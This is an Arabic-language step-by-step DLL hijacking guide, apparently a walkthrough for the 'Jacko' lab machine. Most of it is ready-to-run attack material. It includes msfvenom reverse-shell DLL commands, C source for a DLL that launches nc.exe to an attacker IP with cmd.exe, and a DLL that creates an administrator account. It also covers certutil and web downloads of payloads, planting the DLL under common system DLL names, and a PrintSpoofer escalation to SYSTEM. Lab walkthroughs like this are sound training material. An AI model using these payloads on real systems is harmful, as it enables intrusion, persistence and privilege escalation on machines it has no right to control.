


# DLL Hijacking — دليل شامل من الصفر إلى الاستغلال

---

## المرحلة 0: فهم الأساسيات

### وش هو DLL؟

DLL = Dynamic Link Library — ملف فيه كود جاهز تستخدمه البرامج بدل ما تكتب الكود من جديد. مثلاً: `kernel32.dll` فيها دوال التعامل مع الملفات والذاكرة.

### كيف Windows يبحث عن DLL؟ (DLL Search Order)

لما برنامج يحتاج DLL، Windows يبحث بالترتيب:

```
1. مجلد البرنامج نفسه (Application Directory)
2. C:\Windows\System32
3. C:\Windows\System
4. C:\Windows
5. المجلد الحالي (Current Directory)
6. المجلدات في متغير PATH ← ← ← هنا الثغرة
```

### متى تصير ثغرة؟

لما تتوفر 3 شروط:

```
✅ شرط 1: برنامج يحاول يحمل DLL
✅ شرط 2: الـ DLL مو موجودة في المجلدات الأولى (مفقودة)
✅ شرط 3: أنت تقدر تكتب في مجلد يأتي في ترتيب البحث
```

---

## المرحلة 1: الاستطلاع (Reconnaissance)

### الخطوة 1.1: اكتشف مجلدات PATH القابلة للكتابة

```powershell
# اعرض متغير PATH
$env:Path -split ';'
```

```powershell
# تحقق من صلاحيات الكتابة لكل مجلد في PATH
foreach ($dir in ($env:Path -split ';')) {
    if (Test-Path $dir) {
        $acl = Get-Acl $dir
        foreach ($access in $acl.Access) {
            if ($access.FileSystemRights -match 'Write|Modify|FullControl|CreateFiles' -and
                $access.AccessControlType -eq 'Allow') {
                Write-Host "[WRITABLE] $dir — $($access.IdentityReference): $($access.FileSystemRights)" -ForegroundColor Red
            }
        }
    }
}
```

```cmd
:: نسخة CMD بسيطة
for %A in ("%path:;=";"%") do ( icacls "%~A" 2>nul | findstr /i "(F) (M) (W) :\" )
```

### الخطوة 1.2: اعرف البرامج غير الافتراضية الشغالة

```powershell
# البروسسات مع مساراتها
Get-Process | Where-Object {$_.Path -ne $null} |
    Select-Object ProcessName, Id, Path |
    Where-Object {$_.Path -notmatch 'Windows\\System32|Windows\\SysWOW64'} |
    Format-Table -AutoSize
```

```powershell
# الخدمات (Services) غير المايكروسوفت
Get-WmiObject Win32_Service |
    Where-Object {$_.PathName -notmatch 'Windows|Microsoft' -and $_.State -eq 'Running'} |
    Select-Object Name, DisplayName, PathName, StartMode |
    Format-Table -AutoSize
```

```cmd
:: CMD version
wmic process list full | findstr /i "ExecutablePath"
wmic service where "state='Running'" get name,pathname
```

### الخطوة 1.3: شوف الـ Scheduled Tasks

```powershell
Get-ScheduledTask | Where-Object {$_.State -eq 'Ready' -or $_.State -eq 'Running'} |
    ForEach-Object {
        $actions = $_.Actions | Select-Object -ExpandProperty Execute
        [PSCustomObject]@{
            TaskName = $_.TaskName
            Execute  = $actions
        }
    } | Format-Table -AutoSize
```

```cmd
schtasks /query /fo LIST /v | findstr /i "Task To Run"
```

---

## المرحلة 2: اكتشاف DLLs المفقودة

### الطريقة A: Process Monitor (تحتاج Admin) ⭐ الأفضل

```
1. حمل Procmon من: https://learn.microsoft.com/en-us/sysinternals/downloads/procmon
2. شغله كـ Administrator
3. اضف فلتر:
   - Column: "Result"     | Relation: "is" | Value: "NAME NOT FOUND"
   - Column: "Path"       | Relation: "ends with" | Value: ".dll"
4. راقب — كل سطر يظهر = DLL مفقودة
5. ابحث عن DLLs مفقودة في مجلد قابل للكتابة (مثل C:\JavaTemp)
```

### الطريقة B: بدون Admin — تجربة يدوية

إذا ما عندك Admin (مثل حالتك)، تستخدم طريقة التجربة والخطأ:

```powershell
# الخطوة 1: اعرف أي DLLs يستخدمها البرنامج المستهدف
# مثال: wrapper.exe و java.exe

# شوف الـ DLLs المحملة حالياً لكل process
Get-Process wrapper | Select-Object -ExpandProperty Modules |
    Select-Object ModuleName, FileName | Format-Table -AutoSize

Get-Process java | Select-Object -ExpandProperty Modules |
    Select-Object ModuleName, FileName | Format-Table -AutoSize
```

```powershell
# لو ما اشتغل الأمر فوق (أحياناً يطلب صلاحيات)، جرب:
tasklist /m /fi "IMAGENAME eq wrapper.exe"
tasklist /m /fi "IMAGENAME eq java.exe"
```

### الطريقة C: DLL معروفة مفقودة في Windows

هذي DLLs شائعة ممكن تكون مفقودة:

```
# DLLs شائعة تنلقط من PATH:
wbemcomn.dll        — WMI
amsi.dll            — Anti-Malware Scan Interface
version.dll         — Version checking
userenv.dll         — User Environment
dbghelp.dll         — Debug Helper
winhttp.dll         — HTTP Client
profapi.dll         — Profile API
netapi32.dll        — Network API
MSASN1.dll          — ASN.1
dhcpcsvc.dll        — DHCP Client
fltLib.dll          — Filter Library
wtsapi32.dll        — Terminal Services
cscapi.dll          — Offline Files
```

### الطريقة D: ابحث عن DLLs في مجلد البرنامج

```powershell
# شوف DLLs الموجودة مع H2/wrapper
dir "C:\Program Files (x86)\H2" -Recurse -Filter "*.dll" | Select-Object FullName

# شوف DLLs مع Java
dir "C:\Program Files (x86)\Common Files\Oracle\Java" -Recurse -Filter "*.dll" | Select-Object FullName
```

```powershell
# قارن: شوف أي DLLs يحاول البرنامج يحملها
# من خلال ملفات الـ config أو manifest
dir "C:\Program Files (x86)\H2" -Recurse -Include "*.config","*.manifest","*.ini" |
    Get-Content | Select-String -Pattern "\.dll"
```

---

## المرحلة 3: صناعة DLL خبيثة

### الطريقة A: msfvenom (Reverse Shell)

```bash
# من كالي — DLL تعطيك reverse shell
# 64-bit
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=443 -f dll -o hijack.dll

# 32-bit (لو البرنامج 32-bit مثل H2/wrapper)
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=443 -f dll -o hijack.dll
```

⚠️ **مهم**: شوف إذا البرنامج 32-bit أو 64-bit:

```powershell
# تحقق: لو في "Program Files (x86)" = 32-bit
# wrapper.exe في "Program Files (x86)\H2" → استخدم 32-bit DLL
```

### الطريقة B: DLL يدوية بـ C (أكثر تحكم)

```c
// hijack.c — ترسل reverse shell عند التحميل
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // شغل الأمر لما الـ DLL تنحمل
        system("cmd.exe /c C:\\Users\\tony\\Downloads\\nc.exe 192.168.45.206 443 -e cmd.exe");
    }
    return TRUE;
}
```

```bash
# Compile من كالي:
# 64-bit
x86_64-w64-mingw32-gcc -shared -o hijack.dll hijack.c

# 32-bit
i686-w64-mingw32-gcc -shared -o hijack.dll hijack.c
```

### الطريقة C: DLL تضيف مستخدم Admin

```c
// addadmin.c
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        system("net user hacker P@ssw0rd123! /add");
        system("net localgroup Administrators hacker /add");
    }
    return TRUE;
}
```

```bash
i686-w64-mingw32-gcc -shared -o hijack.dll addadmin.c
```

### الطريقة D: DLL كـ Proof of Concept فقط (للتأكد)

```c
// poc.c — بس تكتب ملف كـ proof إن الـ DLL انحملت
#include <windows.h>
#include <stdio.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        FILE *f = fopen("C:\\Users\\tony\\Downloads\\DLL_HIJACKED.txt", "w");
        if (f) {
            fprintf(f, "DLL Hijack successful! Loaded by PID: %d\n", GetCurrentProcessId());
            fclose(f);
        }
    }
    return TRUE;
}
```

```bash
i686-w64-mingw32-gcc -shared -o poc.dll poc.c
```

---

## المرحلة 4: رفع الـ DLL وتجهيز المكان

### الخطوة 4.1: شغل سيرفر على كالي

```bash
# شغل listener للـ reverse shell
nc -nlvp 443

# في تيرمنال ثاني — شغل HTTP server
python3 -m http.server 80
```

### الخطوة 4.2: حمل الـ DLL على الماشين

```powershell
# من PowerShell على الماشين
certutil -urlcache -f http://YOUR_IP/hijack.dll C:\JavaTemp\hijack.dll
```

```powershell
# أو
Invoke-WebRequest -Uri http://YOUR_IP/hijack.dll -OutFile C:\JavaTemp\hijack.dll
```

```powershell
# أو
(New-Object Net.WebClient).DownloadFile('http://YOUR_IP/hijack.dll','C:\JavaTemp\hijack.dll')
```

### الخطوة 4.3: انسخ الـ DLL بأسماء مختلفة

```powershell
# DLLs شائعة — جرب كل وحدة
$dlls = @(
    "version.dll",
    "userenv.dll",
    "dbghelp.dll",
    "winhttp.dll",
    "profapi.dll",
    "netapi32.dll",
    "amsi.dll",
    "wbemcomn.dll",
    "wtsapi32.dll",
    "cscapi.dll",
    "MSASN1.dll",
    "dhcpcsvc.dll",
    "fltLib.dll",
    "cryptsp.dll",
    "sspicli.dll"
)

foreach ($dll in $dlls) {
    Copy-Item C:\JavaTemp\hijack.dll "C:\JavaTemp\$dll" -Force
    Write-Host "[+] Created C:\JavaTemp\$dll"
}
```

```cmd
:: CMD version
for %d in (version.dll userenv.dll dbghelp.dll winhttp.dll profapi.dll netapi32.dll amsi.dll wbemcomn.dll wtsapi32.dll cscapi.dll) do copy C:\JavaTemp\hijack.dll C:\JavaTemp\%d
```

---

## المرحلة 5: التفعيل والانتظار (Trigger)

### السيناريو A: الـ DLL تنحمل تلقائي

بعض الـ DLLs تنحمل كل ما البرنامج يسوي عملية معينة. استنى وراقب الـ listener.

### السيناريو B: تحتاج ريستارت للـ Service

```powershell
# لو تقدر توقف وتشغل service
Restart-Service -Name "H2DatabaseService" -Force

# أو
net stop H2DatabaseService
net start H2DatabaseService
```

```powershell
# من WinPEAS عرفنا إن tony يقدر يتحكم بـ RmSvc
Restart-Service -Name "RmSvc" -Force
```

### السيناريو C: تحتاج ريستارت للماشين

```powershell
# لو عندك صلاحية (SeShutdownPrivilege - لكنها DISABLED عندك)
shutdown /r /t 0
```

### السيناريو D: حاول تفعل البرنامج يدوي

```powershell
# جرب تستخدم H2 Console عبر المتصفح
# أي عملية في H2 ممكن تحمل DLL

# أو شغل Java يدوي:
& "C:\Program Files (x86)\Common Files\Oracle\Java\javapath\java.exe" -version
```

---

## المرحلة 6: التأكد والتنظيف

### التأكد من النجاح

```powershell
# لو استخدمت POC DLL — تحقق من الملف
type C:\Users\tony\Downloads\DLL_HIJACKED.txt

# لو استخدمت addadmin DLL — تحقق من المستخدم
net user hacker
net localgroup Administrators

# لو reverse shell — شوف الـ listener على كالي
# المفروض يجيك اتصال
```

### تنظيف (بعد ما تخلص)

```powershell
# احذف كل الـ DLLs اللي حطيتها
Remove-Item C:\JavaTemp\*.dll -Force

# أو
del C:\JavaTemp\*.dll
```

---

## Checklist سريع (خطوة بخطوة)

```
□ 1. هل فيه مجلد قابل للكتابة في PATH؟
     → $env:Path -split ';' ثم icacls على كل مجلد

□ 2. وش البرامج غير الافتراضية الشغالة؟
     → Get-Process | Where-Object {$_.Path -ne $null}

□ 3. هل تقدر تشوف DLLs المحملة حالياً؟
     → tasklist /m /fi "IMAGENAME eq target.exe"

□ 4. هل عندك Process Monitor (تحتاج Admin)؟
     → نعم: فلتر على NAME NOT FOUND + .dll
     → لا: استخدم قائمة DLLs الشائعة

□ 5. البرنامج 32-bit أو 64-bit؟
     → Program Files (x86) = 32-bit
     → Program Files = 64-bit

□ 6. صنع الـ DLL الخبيثة
     → msfvenom (reverse shell) أو gcc (يدوي)
     → تأكد من المعمارية (32/64)

□ 7. رفع الـ DLL على المجلد القابل للكتابة
     → certutil -urlcache -f http://IP/hijack.dll C:\path\name.dll

□ 8. نسخ الـ DLL بأسماء مختلفة
     → جرب الأسماء الشائعة

□ 9. تفعيل (Trigger)
     → ريستارت service / ريستارت ماشين / تفاعل مع البرنامج

□ 10. مراقبة الـ listener
      → nc -nlvp PORT

□ 11. تنظيف بعد الانتهاء
      → del C:\path\*.dll
```

---

## ملاحظات مهمة

### متى DLL Hijacking تكون خيار جيد؟

```
✅ عندك Process Monitor (Admin access)
✅ عرفت DLL مفقودة بالضبط
✅ المجلد القابل للكتابة يأتي قبل المجلد الأصلي في Search Order
✅ الـ Service تشتغل بصلاحيات عالية (SYSTEM/Admin)
```

### متى تكون خيار سيء؟

```
❌ ما عندك Admin (ما تقدر تشغل Process Monitor)
❌ ما تعرف أي DLL مفقودة (تخمين)
❌ الـ Service تشتغل بنفس صلاحياتك
❌ عندك طرق أسهل (مثل SeImpersonatePrivilege)
```

---

## بدائل أفضل في حالتك (Jacko Machine)

**SeImpersonatePrivilege موجود = Potato Attack أسرع وأضمن:**

```bash
# كالي
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
python3 -m http.server 80
```

```powershell
# الماشين
certutil -urlcache -f http://YOUR_IP/PrintSpoofer64.exe C:\Users\tony\Downloads\ps.exe
C:\Users\tony\Downloads\ps.exe -i -c cmd
# whoami → nt authority\system ✅
```

























